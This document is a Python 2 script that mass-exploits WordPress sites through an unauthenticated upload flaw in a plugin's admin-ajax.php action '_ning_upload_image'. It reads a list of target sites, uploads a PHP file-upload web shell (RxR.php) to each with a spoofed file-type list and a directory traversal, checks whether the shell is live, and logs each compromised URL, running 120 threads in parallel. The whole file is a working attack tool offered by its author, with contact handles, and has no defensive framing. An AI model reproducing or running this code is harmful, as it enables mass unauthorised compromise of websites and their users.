import sys , requests, re , socket , random , string, json
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 

init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN


requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')




headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
# Coded By RxR HaCkEr


banner = '''{}
           
______       ______   _   _         _____  _     _____           
| ___ \     | ___ \ | | | |       /  __ \| |   |  ___|         
| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __   
|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
| |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |     
\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|       


Coded By: RxR HaCkEr Telegram:@Mjzrh , Skype:a.789a    

\n'''.format(fr)
print banner

	

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def exploit(url) :
    try :
			dom = domain(url)
			url = URLdomain(url)
			if 'www.' in url:
				username = url.replace('www.', '')
			else:
				username = url
			if '.' in username:
				username = username.split('.')[0]
			if 'http://' in username:
				username = username.replace('http://', '')
			else:
				username = username.replace('https://', '')
			up=username.title()

			shell = """<?  echo "RxR HaCkEr"; $cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; }   ?>"""
			filename = "RxR.php"
			Agent = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
			
			files = {'files[]':(filename,shell)}

			data = {"allowed_file_types" : "php,jpg,jpeg,php,txt","upload" : json.dumps({"dir" : "../"})}
			r = requests.post(url + "/wp-admin/admin-ajax.php?action=_ning_upload_image", files=files, data=data,headers=headers).content
			check = requests.get(url + "/"+filename,headers=headers)
			if 'RxR HaCkEr' in check.content:
				print 'Target :' + url +  '--> {}[Succefully]'.format(fg)
				open('Success_shell.txt', 'a').write(url + "/" +filename + "\n")
			else:
				print('Target:{}  --> {}[Failed]').format(url,fr)
    except :
       print('Target:{}  --> {}[Failed]').format(url,fr)

mp = Pool(120)
mp.map(exploit, target)
mp.close()
mp.join()
